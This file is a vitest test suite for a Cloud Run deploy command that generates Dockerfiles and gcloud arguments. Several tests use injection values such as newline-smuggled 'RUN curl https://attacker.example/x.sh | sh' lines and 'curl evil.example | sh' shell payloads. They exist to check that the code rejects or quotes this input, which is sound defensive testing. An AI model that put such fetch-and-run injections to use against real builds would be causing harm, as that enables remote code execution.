/**
 * @license
 * Copyright 2026 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import * as fs from 'node:fs/promises';
import * as os from 'node:os';
import * as path from 'node:path';
import {afterEach, beforeEach, describe, expect, it, Mock, vi} from 'vitest';
import {
  createDockerFileContent,
  CreateDockerFileContentOptions,
  deployToCloudRun,
} from '../../src/cli/deploy/cli_deploy_cloud_run.js';
import {A2A_AUTH_TOKEN_ENV_VAR} from '../../src/server/adk_api_server.js';
import {
  createTempDir,
  isFile,
  isFolderExists,
  loadFileData,
  tryToFindFileRecursively,
} from '../../src/utils/file_utils.js';

type Callback = (error: Error | null, result?: unknown) => void;

const A2A_TOKEN = 'test-a2a-token';

const execMock = vi.fn();
const spawnMock =
  vi.fn<(cmd: string, args: string[], opts: unknown) => unknown>();

vi.mock('node:child_process', () => ({
  exec: (cmd: string, callback: Callback) => execMock(cmd, callback),
  spawn: (cmd: string, args: string[], opts: unknown) =>
    spawnMock(cmd, args, opts),
}));

// Implementations go in the vi.fn() constructor argument so they survive the
// vi.restoreAllMocks() in afterEach.
vi.mock('node:fs/promises', () => {
  const mockFs = {
    cp: vi.fn(async () => {}),
    mkdir: vi.fn(async () => {}),
    rm: vi.fn(async () => {}),
  };
  return {
    ...mockFs,
    default: mockFs,
  };
});

vi.mock('../../src/utils/agent_loader.js', () => ({
  AgentLoader: vi.fn(() => ({
    listAgents: vi.fn(async () => ['agent1']),
    getAgentFile: vi.fn(async () => ({
      getFilePath: vi.fn(() => 'path/to/agent1.ts'),
    })),
    disposeAll: vi.fn(async () => {}),
  })),
}));

vi.mock('../../src/utils/file_utils.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../../src/utils/file_utils.js')>()),
  createTempDir: vi.fn(),
  isFile: vi.fn(),
  isFolderExists: vi.fn(),
  loadFileData: vi.fn(),
  saveToFile: vi.fn(),
  tryToFindFileRecursively: vi.fn(),
}));

describe('createDockerFileContent', () => {
  const defaultOptions: CreateDockerFileContentOptions = {
    appName: 'test-app',
    project: 'test-project',
    region: 'us-central1',
    port: 8080,
    withUi: false,
    logLevel: 'info',
  };

  it('should create Dockerfile content without --a2a by default', () => {
    const content = createDockerFileContent(defaultOptions);
    expect(content).not.toContain('--a2a');
  });

  it('should create Dockerfile content with --a2a when option is true', () => {
    const content = createDockerFileContent({
      ...defaultOptions,
      a2a: true,
    });
    expect(content).toContain('--a2a');
  });

  it('should use web command when withUi is true', () => {
    const content = createDockerFileContent({
      ...defaultOptions,
      withUi: true,
    });
    expect(content).toContain('npx adk web');
  });

  it('should use api_server command when withUi is false', () => {
    const content = createDockerFileContent({
      ...defaultOptions,
      withUi: false,
    });
    expect(content).toContain('npx adk api_server');
  });

  it('should include other options in adkServerOptions', () => {
    const content = createDockerFileContent({
      ...defaultOptions,
      allowOrigins: 'http://example.com',
      otelToCloud: true,
    });
    expect(content).toContain("--allow_origins='http://example.com'");
    expect(content).toContain('--otel_to_cloud');
  });

  it('should reject logLevel/allowOrigins/sessionServiceUri/artifactServiceUri containing a newline', () => {
    // These reach the shell-interpreted CMD line via adkServerOptions, so a
    // newline in any of them breaks out of that Dockerfile instruction the
    // same way appName/project/region do.
    for (const [label, value] of [
      ['logLevel', {logLevel: 'info\nRUN sh -c "curl evil.example|sh"\n#'}],
      [
        'allowOrigins',
        {allowOrigins: 'http://a\nRUN sh -c "curl evil.example|sh"\n#'},
      ],
      [
        'sessionServiceUri',
        {sessionServiceUri: 'memory://\nRUN sh -c "curl evil.example|sh"\n#'},
      ],
      [
        'artifactServiceUri',
        {artifactServiceUri: 'gs://b\nRUN sh -c "curl evil.example|sh"\n#'},
      ],
    ] as const) {
      expect(() =>
        createDockerFileContent({...defaultOptions, ...value}),
      ).toThrow(new RegExp(`Invalid ${label}`));
    }
  });

  it('should not echo a credentialed sessionServiceUri in the rejection message', () => {
    // The deploy commands log this Error's message, and a session service URI
    // carries its password in the userinfo, so the message must identify the
    // option without reproducing the value.
    const password = 'sw0rdf1sh';
    const uri = `postgres://adk:${password}` + `@db.example.com/agents\nRUN id`;

    let message: string | undefined;
    try {
      createDockerFileContent({...defaultOptions, sessionServiceUri: uri});
    } catch (error) {
      if (error instanceof Error) {
        message = error.message;
      }
    }

    expect(message).toContain('Invalid sessionServiceUri');
    expect(message).toContain(`index ${uri.indexOf('\n')}`);
    expect(message).not.toContain(password);
    expect(message).not.toContain('db.example.com');
  });

  it('should shell-quote logLevel/allowOrigins/sessionServiceUri/artifactServiceUri in the CMD line', () => {
    // These values reach /bin/sh at container start via the CMD line's
    // shell form, so shell metacharacters must be neutralized by quoting.
    const content = createDockerFileContent({
      ...defaultOptions,
      logLevel: 'info; curl evil.example | sh #',
      sessionServiceUri: 'memory://; curl evil.example | sh #',
      artifactServiceUri: 'gs://bucket; curl evil.example | sh #',
    });
    expect(content).toContain("--log_level='info; curl evil.example | sh #'");
    expect(content).toContain(
      "--session_service_uri='memory://; curl evil.example | sh #'",
    );
    expect(content).toContain(
      "--artifact_service_uri='gs://bucket; curl evil.example | sh #'",
    );
  });

  it('should escape an embedded single quote when shell-quoting', () => {
    const content = createDockerFileContent({
      ...defaultOptions,
      logLevel: "info'; curl evil.example | sh #",
    });
    expect(content).toContain(
      "--log_level='info'\\''; curl evil.example | sh #'",
    );
  });

  it('should reject an appName that would break out of the generated Dockerfile', () => {
    // A newline lets an attacker-controlled agent directory name terminate
    // the COPY instruction it's embedded in and start a new Dockerfile
    // instruction (e.g. RUN), executed during `docker build`.
    expect(() =>
      createDockerFileContent({
        ...defaultOptions,
        appName: 'x"\nRUN curl https://attacker.example/x.sh | sh\n#',
      }),
    ).toThrow(/Invalid appName/);
  });

  it('should reject a project that would break out of the generated Dockerfile', () => {
    expect(() =>
      createDockerFileContent({
        ...defaultOptions,
        project: 'p\nRUN curl https://attacker.example/x.sh | sh\n#',
      }),
    ).toThrow(/Invalid project/);
  });

  it('should reject a region that would start a new Dockerfile instruction', () => {
    // region only reaches the ENV GOOGLE_CLOUD_LOCATION= line, not the
    // shell-interpreted CMD line, so the vector here is a newline breaking
    // out of that instruction, not a shell metacharacter.
    expect(() =>
      createDockerFileContent({
        ...defaultOptions,
        region: 'us-central1\nRUN curl https://attacker.example/x.sh | sh\n#',
      }),
    ).toThrow(/Invalid region/);
  });

  it('should still accept appName/project/region containing dots, dashes, and underscores', () => {
    const content = createDockerFileContent({
      ...defaultOptions,
      appName: 'my-agent_v2.1',
      project: 'my-project.example-123',
    });
    expect(content).toContain('agents/my-agent_v2.1/');
    expect(content).toContain('GOOGLE_CLOUD_PROJECT=my-project.example-123');
  });
});

const LABELS_FLAG = '--labels';
const LABELS_PREFIX = `${LABELS_FLAG}=`;

/**
 * Every label value gcloud would read from the argv, in argv order. gcloud
 * accepts both the separate `--labels <value>` form and the inline
 * `--labels=<value>` form, so this collects both.
 */
function labelValues(argv: string[]): string[] {
  return argv.flatMap((arg, i) => {
    if (arg === LABELS_FLAG) return [argv[i + 1]];
    if (arg.startsWith(LABELS_PREFIX)) return [arg.slice(LABELS_PREFIX.length)];
    return [];
  });
}

describe('deployToCloudRun', () => {
  const defaultOptions = {
    agentPath: 'path/to/agent',
    serviceName: 'test-service',
    tempFolder: '/tmp/test-deploy',
    adkVersion: '1.0.0',
    project: 'test-project',
    region: 'us-central1',
    port: 8080,
    withUi: false,
    logLevel: 'info',
  };

  beforeEach(() => {
    vi.clearAllMocks();
    vi.spyOn(console, 'info').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
    vi.spyOn(console, 'warn').mockImplementation(() => {});

    // Default mock behavior
    (isFile as Mock).mockResolvedValue(false);
    (isFolderExists as Mock).mockResolvedValue(false);
    (tryToFindFileRecursively as Mock).mockResolvedValue(
      'path/to/package.json',
    );
    (loadFileData as Mock).mockResolvedValue({
      dependencies: {
        '@google/adk': '^1.0.0',
      },
    });

    execMock.mockImplementation((cmd: string, callback: Callback) => {
      if (cmd.includes('config get-value project')) {
        callback(null, {stdout: 'gcloud-project\n'});
      } else if (cmd.includes('config get-value run/region')) {
        callback(null, {stdout: 'gcloud-region\n'});
      } else {
        callback(null, {stdout: ''});
      }
    });

    spawnMock.mockReturnValue({
      on: vi.fn((event: string, cb: (code: number) => void) => {
        if (event === 'close') {
          process.nextTick(() => cb(0));
        }
      }),
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('should deploy successfully with explicit options', async () => {
    await deployToCloudRun(defaultOptions);

    expect(spawnMock).toHaveBeenCalledWith(
      'gcloud',
      expect.arrayContaining([
        'run',
        'deploy',
        'test-service',
        '--project',
        'test-project',
        '--region',
        'us-central1',
      ]),
      expect.any(Object),
    );
    expect(fs.rm).toHaveBeenCalledWith('/tmp/test-deploy', {
      recursive: true,
      force: true,
    });
  });

  // Deliberately not the first test in the block: it only holds if the fakes
  // survived the preceding test's `vi.restoreAllMocks()`. This pins the
  // fixture rather than product behaviour, because every call site awaits
  // these fakes, where a bare `undefined` and a resolved promise behave alike.
  it('should keep the node:fs/promises fakes returning promises after a restore', async () => {
    await expect(
      fs.rm('/tmp/x', {recursive: true, force: true}),
    ).resolves.toBeUndefined();
    await expect(fs.mkdir('/tmp/x')).resolves.toBeUndefined();
    await expect(fs.cp('/tmp/x', '/tmp/y')).resolves.toBeUndefined();
  });

  it('should resolve default project and region from gcloud if not provided', async () => {
    const optionsWithoutProjectRegion = {
      ...defaultOptions,
      project: '',
      region: '',
    };

    await deployToCloudRun(optionsWithoutProjectRegion);

    expect(execMock).toHaveBeenCalledWith(
      expect.stringContaining('config get-value project'),
      expect.any(Function),
    );
    expect(execMock).toHaveBeenCalledWith(
      expect.stringContaining('config get-value run/region'),
      expect.any(Function),
    );

    expect(spawnMock).toHaveBeenCalledWith(
      'gcloud',
      expect.arrayContaining([
        '--project',
        'gcloud-project',
        '--region',
        'gcloud-region',
      ]),
      expect.any(Object),
    );
  });

  it('should throw error if project resolution fails (unset)', async () => {
    const optionsWithoutProject = {
      ...defaultOptions,
      project: '',
    };

    execMock.mockImplementation((cmd: string, callback: Callback) => {
      if (cmd.includes('config get-value project')) {
        callback(null, {stdout: '(unset)\n'});
      } else if (cmd.includes('config get-value run/region')) {
        callback(null, {stdout: 'gcloud-region\n'});
      }
    });

    await expect(deployToCloudRun(optionsWithoutProject)).rejects.toThrow(
      /Project is not specified/,
    );
  });

  it('should create a private temp folder when none is supplied', async () => {
    const createdTempFolder = '/tmp/cloud_run_deploy_src-abc123';
    (createTempDir as Mock).mockResolvedValue(createdTempFolder);

    await deployToCloudRun({...defaultOptions, tempFolder: undefined});

    expect(createTempDir).toHaveBeenCalledWith('cloud_run_deploy_src');
    expect(spawnMock.mock.calls[0][1]).toContain(createdTempFolder);
    expect(isFolderExists).not.toHaveBeenCalled();
    expect(fs.rm).toHaveBeenCalledTimes(1);
    expect(fs.rm).toHaveBeenCalledWith(createdTempFolder, {
      recursive: true,
      force: true,
    });
  });

  it('should clean up existing temp folder before deploying', async () => {
    (isFolderExists as Mock).mockResolvedValue(true);

    await deployToCloudRun(defaultOptions);

    expect(fs.rm).toHaveBeenCalledWith('/tmp/test-deploy', {
      recursive: true,
      force: true,
    });
  });

  it('should throw error if package.json has no dependencies', async () => {
    const consoleErrorSpy = vi.spyOn(console, 'error');
    (loadFileData as Mock).mockResolvedValue({});

    await deployToCloudRun(defaultOptions);

    expect(consoleErrorSpy).toHaveBeenCalledWith(
      expect.stringContaining('\x1b[31mFailed to deploy to Cloud Run:'),
      expect.stringContaining('No dependencies found in package.json'),
      expect.stringContaining('\x1b[0m'),
    );
  });

  it('should throw error if required npm packages are missing in package.json', async () => {
    const consoleErrorSpy = vi.spyOn(console, 'error');
    (loadFileData as Mock).mockResolvedValue({
      dependencies: {
        'some-other-package': '1.0.0',
      },
    });

    await deployToCloudRun(defaultOptions);

    expect(consoleErrorSpy).toHaveBeenCalledWith(
      expect.stringContaining('\x1b[31mFailed to deploy to Cloud Run:'),
      expect.stringContaining(
        'Package "@google/adk" is required but not found',
      ),
      expect.stringContaining('\x1b[0m'),
    );
  });

  it('should forward the A2A token to Cloud Run as an environment variable', async () => {
    const consoleWarnSpy = vi.spyOn(console, 'warn');

    await deployToCloudRun({
      ...defaultOptions,
      a2a: true,
      a2aAuthToken: A2A_TOKEN,
    });

    const gcloudArgs = spawnMock.mock.calls[0][1];
    const flagIndex = gcloudArgs.indexOf('--update-env-vars');
    expect(flagIndex).toBeGreaterThan(-1);
    expect(gcloudArgs[flagIndex + 1]).toBe(
      `${A2A_AUTH_TOKEN_ENV_VAR}=${A2A_TOKEN}`,
    );
    expect(consoleWarnSpy).not.toHaveBeenCalledWith(
      expect.stringContaining('WITHOUT authentication'),
    );
  });

  it('should not touch environment variables when no A2A token is given', async () => {
    await deployToCloudRun(defaultOptions);

    const gcloudArgs = spawnMock.mock.calls[0][1];
    expect(gcloudArgs).not.toContain('--update-env-vars');
    expect(gcloudArgs.join(' ')).not.toContain(A2A_AUTH_TOKEN_ENV_VAR);
  });

  it.each(['--set-env-vars=FOO=bar', '--remove-env-vars=FOO'])(
    'should reject %s, which would clobber the A2A token',
    async (extraGcloudArg) => {
      await expect(
        deployToCloudRun({
          ...defaultOptions,
          a2a: true,
          a2aAuthToken: A2A_TOKEN,
          extraGcloudArgs: [extraGcloudArg],
        }),
      ).rejects.toThrow(/conflict with ADK's automatic configuration/);
    },
  );

  it('should not create a temp folder when the gcloud args are rejected', async () => {
    await expect(
      deployToCloudRun({
        ...defaultOptions,
        tempFolder: undefined,
        extraGcloudArgs: ['--project=other'],
      }),
    ).rejects.toThrow(/conflict with ADK's automatic configuration/);

    expect(createTempDir).not.toHaveBeenCalled();
    expect(fs.rm).not.toHaveBeenCalled();
  });

  it('should still allow user env-var flags when no A2A token is given', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: ['--set-env-vars=FOO=bar'],
    });

    expect(spawnMock.mock.calls[0][1]).toContain('--set-env-vars=FOO=bar');
  });

  it('should warn when deploying an A2A surface with no token', async () => {
    const consoleWarnSpy = vi.spyOn(console, 'warn');

    await deployToCloudRun({...defaultOptions, a2a: true});

    expect(consoleWarnSpy).toHaveBeenCalledWith(
      expect.stringContaining('WITHOUT authentication'),
    );
  });

  it('removes the staging folder from the exit listener when the deploy is interrupted', async () => {
    const stagingFolder = mkdtempSync(
      path.join(os.tmpdir(), 'adk-cloud-run-exit-'),
    );
    mkdirSync(path.join(stagingFolder, 'agents', 'agent1'), {recursive: true});
    writeFileSync(
      path.join(stagingFolder, 'agents', 'agent1', 'agent.js'),
      'agent',
    );

    const baselineListeners = process.listeners('exit');
    let interrupt: {before: boolean; after: boolean} | undefined;

    spawnMock.mockImplementation(() => {
      // Ctrl-C while gcloud runs: the SIGINT handler calls process.exit(),
      // which runs the 'exit' listeners and never resumes the awaited deploy,
      // so its finally block never executes.
      const armed = process
        .listeners('exit')
        .filter((listener) => !baselineListeners.includes(listener));
      expect(armed).toHaveLength(1);
      const before = existsSync(stagingFolder);
      armed[0](0);
      interrupt = {before, after: existsSync(stagingFolder)};

      return {
        on: vi.fn((event: string, cb: (code: number) => void) => {
          if (event === 'close') {
            process.nextTick(() => cb(0));
          }
        }),
      };
    });

    try {
      await deployToCloudRun({...defaultOptions, tempFolder: stagingFolder});

      expect(interrupt).toEqual({before: true, after: false});
      expect(process.listeners('exit')).toEqual(baselineListeners);
    } finally {
      rmSync(stagingFolder, {recursive: true, force: true});
    }
  });

  it('should handle spawn failures', async () => {
    const consoleErrorSpy = vi.spyOn(console, 'error');
    spawnMock.mockReturnValue({
      on: vi.fn((event: string, cb: (code: number) => void) => {
        if (event === 'close') {
          process.nextTick(() => cb(1));
        }
      }),
    });

    await deployToCloudRun(defaultOptions);

    expect(consoleErrorSpy).toHaveBeenCalledWith(
      expect.stringContaining('\x1b[31mFailed to deploy to Cloud Run:'),
      expect.stringContaining('Command failed with exit code 1'),
      expect.stringContaining('\x1b[0m'),
    );
  });

  it('should merge a user --labels=k=v into the single ADK label flag', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: ['--labels=team=abc'],
    });

    expect(labelValues(spawnMock.mock.calls[0][1])).toEqual([
      'created-by=adk,team=abc',
    ]);
  });

  it('should not forward a second --labels flag to gcloud', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: ['--labels=team=abc'],
    });

    const argv = spawnMock.mock.calls[0][1];
    expect(
      argv.filter(
        (arg) => arg === LABELS_FLAG || arg.startsWith(LABELS_PREFIX),
      ),
    ).toEqual([LABELS_FLAG]);
  });

  it.each([
    {name: 'omitted', extraGcloudArgs: undefined},
    {name: 'empty', extraGcloudArgs: []},
  ])(
    'should emit only the ADK label when extra args are $name',
    async ({extraGcloudArgs}) => {
      await deployToCloudRun({...defaultOptions, extraGcloudArgs});

      expect(labelValues(spawnMock.mock.calls[0][1])).toEqual([
        'created-by=adk',
      ]);
    },
  );

  it('should merge multiple --labels arguments in order', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: ['--labels=env=test', '--labels=team=myteam'],
    });

    expect(labelValues(spawnMock.mock.calls[0][1])).toEqual([
      'created-by=adk,env=test,team=myteam',
    ]);
  });

  it('should keep a comma-separated label value intact', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: ['--labels=env=test,team=myteam'],
    });

    expect(labelValues(spawnMock.mock.calls[0][1])).toEqual([
      'created-by=adk,env=test,team=myteam',
    ]);
  });

  it('should merge labels while forwarding other gcloud args in order', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: ['--memory=1Gi', '--labels=env=test', '--cpu=1'],
    });

    const argv = spawnMock.mock.calls[0][1];
    expect(labelValues(argv)).toEqual(['created-by=adk,env=test']);
    expect(argv.indexOf('--memory=1Gi')).toBeGreaterThan(-1);
    expect(argv.indexOf('--cpu=1')).toBeGreaterThan(
      argv.indexOf('--memory=1Gi'),
    );
  });

  it('should merge the space-separated --labels form', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: [LABELS_FLAG, 'team=abc'],
    });

    const argv = spawnMock.mock.calls[0][1];
    expect(labelValues(argv)).toEqual(['created-by=adk,team=abc']);
    expect(argv.filter((arg) => arg === 'team=abc')).toEqual([]);
  });

  it('should drop a --labels token that has no value after it', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: [LABELS_FLAG],
    });

    const argv = spawnMock.mock.calls[0][1];
    expect(labelValues(argv)).toEqual(['created-by=adk']);
    expect(argv).not.toContain('');
  });

  it('should not swallow the flag that follows a bare --labels token', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: [LABELS_FLAG, '--no-traffic'],
    });

    const argv = spawnMock.mock.calls[0][1];
    expect(labelValues(argv)).toEqual(['created-by=adk']);
    expect(argv).toContain('--no-traffic');
  });

  it('should drop an empty --labels= value', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: [LABELS_PREFIX],
    });

    expect(labelValues(spawnMock.mock.calls[0][1])).toEqual(['created-by=adk']);
  });

  it('should drop empty segments inside a label value', async () => {
    await deployToCloudRun({
      ...defaultOptions,
      extraGcloudArgs: ['--labels=env=test,', LABELS_FLAG, ',team=myteam'],
    });

    const [value] = labelValues(spawnMock.mock.calls[0][1]);
    expect(value).toBe('created-by=adk,env=test,team=myteam');
  });
});
